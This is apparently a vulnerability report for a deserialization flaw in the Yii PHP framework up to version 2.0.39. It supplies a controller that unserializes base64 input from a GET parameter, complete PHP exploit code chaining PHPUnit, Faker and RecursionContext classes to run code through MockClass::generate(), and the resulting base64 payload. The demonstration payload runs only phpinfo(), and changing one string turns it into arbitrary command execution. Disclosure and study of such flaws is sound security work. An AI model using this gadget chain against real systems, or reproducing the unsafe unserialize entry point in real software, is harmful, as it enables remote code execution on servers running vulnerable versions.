## Vulnerability description

Yii version <=2.0.39 has a deserialization vulnerability. If the framework is referenced and there is a deserialization entry point, an attacker can achieve arbitrary command execution through deserialization. 

The exploitation point is in the generate() method of phpunit\src\Framework\MockObject\MockClass.php

## Affects Version

Yii <= 2.0.39

## vulnerability proof

yii2 v2.0.39 php v7.3.4

![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250317213218097.png)

When setting up the environment, remember to assign a value to cookieValidationKey in config/web.php, and then add a deserialization entry in the actionIndex() method of controllers\SiteController.php.

```php
public function actionIndex()  
{  
    $name = Yii::$app->request->get('input');  
    unserialize(base64_decode($name));  
    return $this->render('index');  
}
```

EXP

```php
<?php   
namespace PHPUnit\Framework\MockObject{  
    final class MockClass{  
        public $mockName;  
        public $classCode;  
        public function  __construct()  
        {  
            $this->mockName = "MockClass";  
            $this->classCode = "phpinfo();";  
        }  
    }  
  
}  
namespace PHPUnit\Framework {  
  
    class TestSuite  
    {  
        public $iteratorFilter;  
    }  
}  
namespace Faker{  
use PHPUnit\Framework\MockObject\MockClass;  
    class Generator{  
        public $formatters;  
        public function __construct() {  
            $this->formatters['factory'] = [new MockClass(), 'generate'];  
        }  
    }  
  
}  
namespace SebastianBergmann\RecursionContext{  
    final class Context  
    {  
        public $arrays;  
    }  
  
    $a = new Context();  
    $a->arrays = new \PHPUnit\Framework\TestSuite();  
    $a->arrays->iteratorFilter = new \Faker\Generator();  
    echo base64_encode(serialize($a));  
}
```

After serialization

```
Tzo0MjoiU2ViYXN0aWFuQmVyZ21hbm5cUmVjdXJzaW9uQ29udGV4dFxDb250ZXh0IjoxOntzOjY6ImFycmF5cyI7TzoyNzoiUEhQVW5pdFxGcmFtZXdvcmtcVGVzdFN1aXRlIjoxOntzOjE0OiJpdGVyYXRvckZpbHRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoyOntzOjEwOiJmb3JtYXR0ZXJzIjthOjE6e3M6NzoiZmFjdG9yeSI7YToyOntpOjA7TzozODoiUEhQVW5pdFxGcmFtZXdvcmtcTW9ja09iamVjdFxNb2NrQ2xhc3MiOjI6e3M6ODoibW9ja05hbWUiO3M6OToiTW9ja0NsYXNzIjtzOjk6ImNsYXNzQ29kZSI7czoxMDoicGhwaW5mbygpOyI7fWk6MTtzOjg6ImdlbmVyYXRlIjt9fXM6MzoiYWFhIjtOO319fQ==
```

![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250317213414420.png)
